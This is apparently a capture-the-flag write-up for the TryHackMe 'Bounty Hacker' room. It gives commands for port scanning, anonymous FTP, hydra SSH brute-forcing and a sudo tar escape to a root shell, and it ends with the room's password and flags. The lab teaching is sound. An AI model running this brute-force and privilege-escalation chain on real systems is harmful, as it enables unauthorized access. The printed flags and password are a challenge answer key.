# Bounty-Hunter-CTF
https://tryhackme.com/room/cowboyhacker

**Use nmap to scan for open ports : sudo nmap -sS -sV  10.10.158.109 

*21/tcp open  ftp     vsftpd 3.0.3*

*22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)*

*80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))*


Login to the ftp server anonymous and the following will be found:

*-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt*

*-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt*

get both files to local machine 

cat task.txt :

*1.) Protect Vicious.*

*2.) Plan for Red Eye pickup on the moon.*

*-lin*

cat locks.txt to get some sort of password list

**use hydra to bruteforce the password with lin as user : hydra -t 4 -l lin -P /home/kali/locks.txt ssh://10.10.158.109

*22][ssh] host: 10.10.158.109   login: lin   password: RedDr4gonSynd1cat3*

ssh lin@10.10.158.109 to gain access

ls and cat user.txt to get the first flag

**sudo -l to get some info:

*User lin may run the following commands on bountyhacker:*

    (root) /bin/tar

**Head to https://gtfobins.github.io/#tar to find some exploits to bypass : search for tar

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

cd root and cat root.txt to get the final flag

❔THM Q & A:

## Who wrote the task list? 

lin

## What service can you bruteforce with the text file found?

ssh

## What is the users password? 

RedDr4gonSynd1cat3

## user.txt

🏴‍☠️THM{CR1M3_SyNd1C4T3}

## root.txt

🏴‍☠️THM{80UN7Y_h4cK3r}






